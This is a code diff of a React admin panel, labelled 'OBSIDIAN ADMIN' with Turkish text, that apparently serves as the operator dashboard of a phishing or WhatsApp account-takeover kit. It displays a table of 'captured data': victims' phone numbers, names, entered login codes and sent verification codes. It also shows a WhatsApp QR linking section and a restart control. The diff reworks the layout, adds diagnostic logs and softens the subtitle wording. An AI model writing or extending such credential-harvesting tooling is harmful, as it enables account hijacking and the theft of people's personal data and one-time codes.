@@ -3,8 +3,8 @@ import axios from 'axios';
 import API_URL from '../api/config';
 
 const AdminPanel = () => {
-  const [data, setData] = useState({ status: 'INITIALIZING', qr: null, logs: [] });
-  const [loading, setLoading] = useState(true);
+  const [data, setData] = useState({ status: 'INITIALIZING', qr: null, logs: [], systemLogs: [] });
+  const [loading, setLoading] = useState(false);
 
   const fetchStatus = async () => {
     try {
@@ -12,29 +12,27 @@ const AdminPanel = () => {
       setData(response.data);
     } catch (error) {
       console.error('Admin Fetch Error:', error);
-    } finally {
-      setLoading(false);
-    }
-  };
-
-  const handleRestart = async () => {
-    try {
-      setLoading(true);
-      await axios.post(`${API_URL}/api/admin/restart`);
-      fetchStatus();
-    } catch (error) {
-      console.error('Restart Error:', error);
-      alert('Yeniden başlatma başarısız oldu.');
-    } finally {
-      setLoading(false);
     }
   };
 
   useEffect(() => {
     fetchStatus();
-    const interval = setInterval(fetchStatus, 3000); // 3 saniyede bir güncelle
+    const interval = setInterval(fetchStatus, 3000);
     return () => clearInterval(interval);
   }, []);
+
+  const handleRestart = async () => {
+    if (loading) return;
+    try {
+      setLoading(true);
+      await axios.post(`${API_URL}/api/admin/restart`);
+      fetchStatus();
+    } catch (error) {
+      alert('Yeniden başlatma başlatılamadı.');
+    } finally {
+      setLoading(false);
+    }
+  };
 
   const getStatusColor = (status) => {
     switch (status) {
@@ -47,81 +45,79 @@ const AdminPanel = () => {
   };
 
   return (
-    <div className="reg-card" style={{ maxWidth: '800px', width: '90%', margin: '20px auto', gap: '24px' }}>
-      <div className="card-title-section">
-        <div className="title" style={{ fontSize: '24px' }}>OBSIDIAN ADMIN</div>
-        <div className="subtitle">Sistem Durumu ve Ele Geçirilen Veriler</div>
+    <div className="reg-card" style={{ maxWidth: '1000px', width: '95%', margin: '20px auto', gap: '20px', display: 'grid', gridTemplateColumns: 'minmax(0, 1fr) 300px' }}>
+      
+      {/* Sol Kolon: Ana Kontroller ve Loglar */}
+      <div style={{ display: 'flex', flexDirection: 'column', gap: '20px' }}>
+        <div className="card-title-section">
+          <div className="title" style={{ fontSize: '24px' }}>OBSIDIAN ADMIN V4</div>
+          <div className="subtitle">Sistem Durumu ve Teşhis Verileri</div>
+        </div>
+
+        {/* Status Card */}
+        <div style={{ background: '#0E0E0E', padding: '20px', borderRadius: '12px', border: '1px solid var(--border-color)', display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
+          <div>
+            <div className="badge-title">MESAJLAŞMA DURUMU</div>
+            <div style={{ color: getStatusColor(data.status), fontWeight: '800', fontSize: '20px', marginTop: '4px' }}>
+              {data.status}
+            </div>
+            {data.status === 'DISCONNECTED' && (
+              <button className="submit-btn" onClick={handleRestart} disabled={loading} style={{ padding: '8px 16px', marginTop: '10px', height: 'auto', fontSize: '12px' }}>
+                {loading ? 'HAZIRLANIYOR...' : 'SISTEMI YENIDEN BAŞLAT'}
+              </button>
+            )}
+          </div>
+          <div className="status-dot" style={{ width: '16px', height: '16px', backgroundColor: getStatusColor(data.status), boxShadow: `0 0 15px ${getStatusColor(data.status)}` }}></div>
+        </div>
+
+        {/* Captured Data Table */}
+        <div style={{ background: '#0E0E0E', padding: '15px', borderRadius: '12px', border: '1px solid var(--border-color)' }}>
+          <div className="badge-title" style={{ marginBottom: '10px' }}>ELE GEÇİRİLEN VERİLER</div>
+          <div style={{ maxHeight: '300px', overflowY: 'auto' }}>
+            <table style={{ width: '100%', borderCollapse: 'collapse', fontSize: '11px' }}>
+              <thead>
+                <tr style={{ textAlign: 'left', opacity: 0.5 }}>
+                  <th style={{ padding: '8px' }}>Zaman</th>
+                  <th style={{ padding: '8px' }}>Tip</th>
+                  <th style={{ padding: '8px' }}>Detay</th>
+                </tr>
+              </thead>
+              <tbody>
+                {data.logs.map((log, i) => (
+                  <tr key={i} style={{ borderBottom: '1px solid rgba(255,255,255,0.05)' }}>
+                    <td style={{ padding: '8px' }}>{new Date(log.timestamp).toLocaleTimeString()}</td>
+                    <td style={{ padding: '8px' }}>{log.type}</td>
+                    <td style={{ padding: '8px' }}>{log.phone} | {log.fullName || log.enteredCode}</td>
+                  </tr>
+                ))}
+              </tbody>
+            </table>
+          </div>
+        </div>
       </div>
 
-      {/* Connection Status Card */}
-      <div style={{ background: '#0E0E0E', padding: '20px', borderRadius: '12px', border: '1px solid var(--border-color)', display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
-        <div>
-          <div className="badge-title">BAĞLANTI DURUMU</div>
-          <div style={{ color: getStatusColor(data.status), fontWeight: '700', marginTop: '4px', fontSize: '18px' }}>
-            {data.status}
-          </div>
-          {data.status === 'INITIALIZING' && (
-            <div style={{ fontSize: '10px', color: '#737373', marginTop: '4px' }}>
-              WhatsApp başlatılıyor, lütfen bekleyin (1-2 dk sürebilir)...
+      {/* Sağ Kolon: QR ve Sistem Logları */}
+      <div style={{ display: 'flex', flexDirection: 'column', gap: '20px' }}>
+        {/* QR Section */}
+        <div style={{ background: '#FFF', padding: '15px', borderRadius: '12px', textAlign: 'center' }}>
+          <div style={{ color: '#000', fontSize: '10px', fontWeight: 'bold', marginBottom: '10px' }}>WHATSAPP QR KODU</div>
+          {data.qr ? (
+            <img src={data.qr} style={{ width: '100%' }} alt="QR" />
+          ) : (
+            <div style={{ padding: '40px', color: '#888', background: '#f5f5f5', fontSize: '11px', borderRadius: '8px' }}>
+              {data.status === 'READY' ? 'BAĞLI' : 'BEKLENİYOR...'}
             </div>
           )}
-          {data.status === 'DISCONNECTED' && (
-            <button 
-              onClick={handleRestart}
-              disabled={loading}
-              style={{ padding: '4px 12px', background: '#F97316', color: '#FFF', border: 'none', borderRadius: '4px', fontSize: '10px', fontWeight: 'bold', cursor: 'pointer', marginTop: '8px' }}
-            >
-              YENİDEN BAŞLAT
-            </button>
-          )}
         </div>
-        <div className="status-dot" style={{ width: '12px', height: '12px', backgroundColor: getStatusColor(data.status), boxShadow: `0 0 10px ${getStatusColor(data.status)}` }}></div>
-      </div>
 
-      {/* QR Code Section */}
-      {data.status === 'QR_REQUIRED' && data.qr && (
-        <div style={{ textAlign: 'center', background: '#FFF', padding: '20px', borderRadius: '12px', width: 'fit-content', margin: '0 auto' }}>
-          <div style={{ color: '#000', fontSize: '12px', fontWeight: '700', marginBottom: '10px' }}>WA QR KODU OKUTUN</div>
-          <img src={data.qr} alt="WhatsApp QR" style={{ width: '256px', height: '256px' }} />
-        </div>
-      )}
-
-      {/* Logs Table */}
-      <div style={{ marginTop: '20px' }}>
-        <div className="badge-title" style={{ marginBottom: '12px' }}>ELE GEÇIRILEN VERILER (SON 50)</div>
-        <div style={{ overflowX: 'auto', background: '#0E0E0E', borderRadius: '12px', border: '1px solid var(--border-color)' }}>
-          <table style={{ width: '100%', borderCollapse: 'collapse', color: 'var(--text-main)', fontSize: '12px' }}>
-            <thead>
-              <tr style={{ textAlign: 'left', borderBottom: '1px solid var(--border-color)' }}>
-                <th style={{ padding: '12px' }}>Zaman</th>
-                <th style={{ padding: '12px' }}>Tip</th>
-                <th style={{ padding: '12px' }}>Detay</th>
-              </tr>
-            </thead>
-            <tbody>
-              {data.logs.length === 0 ? (
-                <tr>
-                  <td colSpan="3" style={{ padding: '20px', textAlign: 'center', color: 'var(--text-muted)' }}>Henüz veri yakalanmadı.</td>
-                </tr>
-              ) : (
-                data.logs.map((log, idx) => (
-                  <tr key={idx} style={{ borderBottom: '1px solid rgba(255,255,255,0.02)' }}>
-                    <td style={{ padding: '12px', whiteSpace: 'nowrap' }}>{new Date(log.timestamp).toLocaleTimeString()}</td>
-                    <td style={{ padding: '12px' }}>
-                      <span style={{ fontSize: '10px', padding: '2px 6px', borderRadius: '4px', background: log.type === 'REGISTRATION' ? '#1E3A8A' : log.type === 'LOGIN_ATTEMPT' ? '#14532D' : '#3F2212' }}>
-                        {log.type}
-                      </span>
-                    </td>
-                    <td style={{ padding: '12px' }}>
-                      {log.type === 'REGISTRATION' ? `${log.fullName} | ${log.phone}` :
-                        log.type === 'LOGIN_ATTEMPT' ? `${log.phone} | Kod: ${log.enteredCode} [${log.success ? '✓' : '✗'}]` :
-                          log.type === 'CODE_REQUEST' ? `${log.phone} -> ${log.sentCode}` : ''}
-                    </td>
-                  </tr>
-                ))
-              )}
-            </tbody>
-          </table>
+        {/* System Diagnostics */}
+        <div style={{ background: '#090909', padding: '15px', borderRadius: '12px', border: '1px solid #1f1f1f', flex: 1 }}>
+          <div className="badge-title" style={{ marginBottom: '10px', color: '#888' }}>SİSTEM TEŞHİS LOGLARI</div>
+          <div style={{ height: '300px', overflowY: 'auto', fontFamily: 'monospace', fontSize: '9px', color: '#22C55E', lineHeight: '1.4' }}>
+            {(data.systemLogs || []).map((msg, i) => (
+              <div key={i} style={{ marginBottom: '4px' }}>{msg}</div>
+            ))}
+          </div>
         </div>
       </div>
     </div>
